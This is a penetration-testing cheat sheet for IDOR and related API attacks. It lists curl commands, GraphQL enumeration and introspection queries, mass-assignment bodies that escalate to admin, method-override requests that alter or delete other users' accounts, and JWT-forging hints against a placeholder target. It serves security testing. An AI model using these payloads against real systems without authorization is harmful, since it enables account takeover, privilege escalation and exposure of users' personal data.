# IDOR - API-Specific Attacks

## REST API IDOR Patterns

### Direct Object Reference in Path
```
GET /api/v1/users/123/profile
GET /api/v1/orders/456/invoice
GET /api/v1/documents/789/download
```

### Testing Matrix (Horizontal + Vertical Privilege)
```bash
# As User A, try accessing User B's resources
curl -H "Authorization: Bearer USER_A_TOKEN" https://target.com/api/v1/users/USER_B_ID/profile

# As regular user, try admin-only endpoints
curl -H "Authorization: Bearer USER_TOKEN" https://target.com/api/v1/admin/users
```

## GraphQL IDOR

### Direct Node Query by ID
```graphql
query {
  user(id: "123") {
    email
    ssn
    privateData
  }
}
```

### Batching Queries to Enumerate IDs
```graphql
query {
  user1: user(id: "1") { email }
  user2: user(id: "2") { email }
  user3: user(id: "3") { email }
}
```

### Introspection to Find Hidden Fields/Mutations
```graphql
query IntrospectionQuery {
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

## Mass Assignment (Related to IDOR)
```json
POST /api/v1/users/123
{
  "name": "John",
  "role": "admin",           // Attempt to escalate via extra field
  "isVerified": true,
  "accountBalance": 999999
}
```

## HTTP Method Override for IDOR
```bash
# If GET is protected but PUT/PATCH/DELETE aren't checked the same way
curl -X PUT https://target.com/api/v1/users/OTHER_USER_ID -d '{"email":"new@evil.com"}'
curl -X DELETE https://target.com/api/v1/users/OTHER_USER_ID
curl -X PATCH https://target.com/api/v1/users/OTHER_USER_ID -d '{"role":"admin"}'
```

## API Versioning Bypass
```bash
# Older API version may lack access control fixes
/api/v1/users/123        # Vulnerable
/api/v2/users/123        # Fixed
/api/v1.0/users/123
/api/internal/users/123
```

## Parameter Pollution for IDOR
```
GET /api/user?id=123&id=456     # Which id does backend use?
GET /api/user?id[]=123&id[]=456
```

## JWT-Based IDOR
```bash
# Decode JWT to find user ID claim
echo "JWT_PAYLOAD_PART" | base64 -d

# If JWT is not properly verified server-side (alg:none, weak secret)
# Forge JWT with different user_id/sub claim
```

## Testing Checklist
```
1. Map all API endpoints (Swagger/OpenAPI docs, Burp crawl, JS analysis)
2. For each endpoint accepting an ID, test with another user's ID
3. Test all HTTP methods (GET/POST/PUT/PATCH/DELETE) - authorization may differ per method
4. Test GraphQL introspection + direct node queries
5. Test mass assignment on PUT/PATCH/POST bodies
6. Check JWT claims for tamperable user identifiers
```
